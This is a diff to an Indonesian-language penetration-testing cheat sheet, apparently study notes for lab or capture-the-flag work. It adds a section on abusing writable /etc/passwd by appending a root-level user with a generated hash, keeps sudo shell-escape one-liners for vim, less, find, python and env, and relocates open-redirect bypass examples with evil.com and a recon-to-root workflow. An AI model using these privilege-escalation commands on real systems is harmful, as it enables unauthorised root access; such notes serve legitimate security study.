@@ -185,22 +185,44 @@ Sudo merupakan program yang mengizinkan user untuk menjalankan file/binaries den
 sudo -l
 # lalu cek GTFObins, lalu jalankan memakai sudo, misalnya
 
-sudo vim -c ':!/bin/sh'                       # vim
-sudo less /etc/profile  -> !/bin/sh           # less/more
-sudo find . -exec /bin/sh \; -quit            # find
+sudo vim -c ':!/bin/sh'                       # kalau ketemu vim
+sudo less /etc/profile  -> !/bin/sh           # kalau ketemu less/more
+sudo find . -exec /bin/sh \; -quit            # kalau ketemu find
 sudo python3 -c 'import os;os.system("/bin/sh")'
 sudo env /bin/sh
 ```
 
+## Weak File Permission
+Users dapat merupakan anggota dari beberapa Groups. Groups dapat terdiri dari beberapa Users. Setiap File & Dir memiliki permission tertentu untuk user dan groups.
+```python
+# Landasan teorinya ada pada:
+Readable /etc/shadow
+Writeable /etc/shadow
+Writeable /etc/passwd
 
-Open Redirect (examples)
-```bash
-example.com/redirect?url=http://google.com (Allowed)
-example.com/redirect?url=http://evil.com (Not Allowed)
-example.com/redirect?url=http://evilgoogle.com (Allowed - Bypass!)
-example.com/redirect?url=http://evil.com/?http://google.com (Allowed - Bypass!)
-``` 
-<br> <br>
+# karena ada kemungkinan hal tersebut, selanjutnya cek permission:
+ls -la /etc/passwd /etc/shadow /etc/sudoers.d/
+
+# kalau /etc/passwd bisa di-edit, maka lakukan Generate hash:
+openssl passwd -1 -salt sukagaram passwordlemah123
+
+# Tambah root user (pakai >> bukan >)
+echo 'penjahat:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# Login
+su penjahat    # -> maka diperoleh root
+```
+
+## Alur Umum
+
+```text
+Recon (nmap) → Web enum → Foothold (SQLi/upload/SSTI/LFI/cmdi)
+
+Source: https://github.com/w4h4z/Pentest-Cheat-Sheet/
+→ Reverse shell + stabilize → Enum (linpeas + manual) → GTFOBins
+→ Privesc (SUID/sudo/cron/weak-perm/KERNEL dirtyfrag-copyfail) →  proof
+```
+
 
 * LinPEAS = https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 * LES = https://github.com/The-Z-Labs/linux-exploit-suggester
@@ -217,56 +239,11 @@ Contekan dari sebelah:
 Referensi teknik & payload:
 recon → foothold → reverse shell → enumerasi → privilege escalation → proof.
 
-## Struktur Direktori
-
-```
-.
-├── 00-recon/
-│   ├── Network_Discovery.md
-│   ├── Port_Scanning.md
-│   └── Web_Directory_Bruteforce.md
-├── 01-initial-foothold/
-│   ├── SQL_Injection.md
-│   ├── File_Upload.md
-│   ├── SSTI.md
-│   ├── LFI.md
-│   └── Command_Injection.md
-├── 02-reverse-shell/
-│   ├── Listener.md
-│   ├── Payloads.md
-│   ├── Msfvenom.md
-│   └── Stabilize_TTY.md
-├── 03-enumeration/
-│   ├── LinPEAS.md
-│   ├── Manual_Enumeration.md
-│   └── GTFOBins.md
-├── 04-privilege-escalation/
-│   ├── Kernel_LPE.md
-│   ├── SUID.md
-│   ├── Sudo.md
-│   ├── Weak_Permission.md
-│   └── Writable_Cron.md
-└── 05-proof/
-    └── Submission.md
-```
-
-## Daftar Isi
-
-| Folder | Topik |
-|--------|-------|
-| `00-recon/` | Network discovery, port scan, web directory bruteforce |
-| `01-initial-foothold/` | SQLi, file upload, SSTI, LFI, command injection |
-| `02-reverse-shell/` | Listener, payloads, msfvenom, stabilize TTY |
-| `03-enumeration/` | LinPEAS, manual enum, GTFOBins |
-| `04-privilege-escalation/` | Kernel LPE, SUID, sudo, cron, weak permission |
-| `05-proof/` | Bukti submission (id + hostname) |
-
-## Alur Umum
-
-```text
-Recon (nmap) → Web enum → Foothold (SQLi/upload/SSTI/LFI/cmdi)
-
-Source: https://github.com/w4h4z/Pentest-Cheat-Sheet/
-→ Reverse shell + stabilize → Enum (linpeas + manual) → GTFOBins
-→ Privesc (SUID/sudo/cron/weak-perm/KERNEL dirtyfrag-copyfail) →  proof
-```
+Open Redirect (examples)
+```bash
+example.com/redirect?url=http://google.com (Allowed)
+example.com/redirect?url=http://evil.com (Not Allowed)
+example.com/redirect?url=http://evilgoogle.com (Allowed - Bypass!)
+example.com/redirect?url=http://evil.com/?http://google.com (Allowed - Bypass!)
+``` 
+<br> <br>
